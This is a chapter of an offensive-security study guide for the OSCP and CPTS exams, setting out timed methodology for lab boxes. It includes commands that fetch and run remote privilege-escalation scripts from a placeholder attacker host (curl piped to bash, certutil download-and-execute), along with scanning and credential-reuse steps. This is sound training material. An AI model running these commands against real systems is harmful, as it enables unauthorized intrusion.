# VOLUME IX — Certification Mode (OSCP / CPTS)

This volume is built specifically for structured lab and exam environments. The rules of engagement here are different to real-world red teaming: **time is the enemy**. Every minute spent in a rabbit hole is a minute stolen from a rooted box.

---

## Chapter 1: The OSCP Mental Model

OSCP is not purely a "can you hack?" exam. It is a **"can you follow a disciplined, structured methodology without panicking?"** exam. The passing candidates are not always the most technically gifted. They are the most *disciplined*.

### Core Mindset Rules
1. **Enumerate Wide Before Going Deep.** Scan ALL machines in the range during the first 30 minutes. While you are working on Box 1, your scanner is already running against Box 5.
2. **Document as you go.** Do not rely on memory. Every command you run, every response you receive, screenshoot or log it immediately. You will need these for the report.
3. **No box is an island.** On OSCP, credentials and findings **from one box often work on another**. Keep a shared credential list updated constantly.
4. **The points you need to pass are not all equal.** A low-point box might take 6 hours. A high-point box might fall in 20 minutes. Prioritize breadth early, depth later.

---

## Chapter 2: The OSCP Box Methodology (Time-Boxed)

This is the repeatable sequence to run for every single box in the exam network.

### ⏱️ Minutes 0-15: Full Port Scan (Start Immediately, Review Later)
```bash
# Run this IMMEDIATELY and move on. Don't wait for it.
rustscan -a TARGET_IP --ulimit 5000 -- -sC -sV -oN scans/TARGET_full.txt
```

### ⏱️ Minutes 0-30: Web Recon (If port 80/443 exists)
```bash
# Directory fuzzing in background
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o scans/ffuf_TARGET.json -of json

# Manual browsing: register an account, map all features, note every input field.
```

### ⏱️ Minutes 30-60: Deep Enumeration from Nmap Results
- Check every open port against the service encyclopedias in **Volume II**.
- List all services, and for each one ask: **"What does this give me if it is misconfigured?"**
- Look for version numbers and query `searchsploit` for known CVEs.

### ⏱️ Hour 1-2: First Exploitation Attempt
- Pick the highest-confidence attack vector from your enumeration.
- Give it a **strict 45-minute time box**.
- If no measurable progress after 45 minutes → move to the second vector.

### ⏱️ Hour 2+: PrivEsc (Once Foothold Is Gained)
```bash
# Linux: Run immediately after landing a shell
curl http://YOUR_IP/linpeas.sh | bash

# Windows: Run immediately after landing a shell
certutil -urlcache -f http://YOUR_IP/winPEASx64.exe C:\Windows\Temp\pe.exe && C:\Windows\Temp\pe.exe
```
- While the script runs, **manually check** the top 5 Linux or Windows blind spot items from Volume X.
- The script is noisy and misses context. Your eyes catch what scripts don't.

---

## Chapter 3: Box Failure Recovery Protocol

### 🔴 You've Been Stuck for 1+ Hours and Have Nothing

This is the moment most OSCP candidates panic. Do not panic. Follow this exact sequence:

1. **Write a "State of Knowledge" Summary.** In a plain text note, write down everything you know about the box in 5 bullet points. What is open? What versions? What have you tried? Often the act of writing forces you to see what you've missed.
2. **Check the Volume X Blind Spot Checklist** for both Web and the specific OS.
3. **Examine your Nmap output for UDP ports.** UDP ports are easily missed and OSCP boxes sometimes require them.
4. **Look at the box from a credential reuse perspective.** If you have ANY credential from any previous box, try it here (SSH, SMB, web login).
5. **Take a 15-minute physical break.** Seriously. Walk away. Your subconscious will keep working.

### 🟡 You Have Foothold But Cannot PrivEsc

1. Check `sudo -l` (Linux) or `whoami /priv` (Windows). Full stop.
2. Look for **internal services** listening on local ports (`ss -tnlp` or `netstat -ano`).
3. Look for **files owned by root/SYSTEM** or interesting setuid binaries.
4. Look for other **user home directories** — can you `su` to another user? Are there SSH keys in their home folder?
5. Check for **password reuse**: use the DB password you found on the web app to `su` to a user account.

---

## Chapter 4: Environment-Specific Quirks

### OSCP-Specific Realities
- `msfconsole` is limited to **ONE** box for the entire exam. Choose wisely. Use it only for a box you are **completely stuck on**.
- **Kernel exploits** work, but they are a last resort. They can crash the box, costing you points and time.
- If you are running Kali in a VM, mount a shared folder. Write your report **as you go** — do not leave it all for the end.

### HTB-Specific Realities
- HTB boxes are **harder** and more CTF-flavored than OSCP. You will encounter more obscure vulnerabilities.
- **Active machines** are live. **Retired machines** have public write-ups — if you're stuck after an hour, reading one is a legitimate learning tool.
- The initial foothold on HTB boxes is almost always the hardest part.
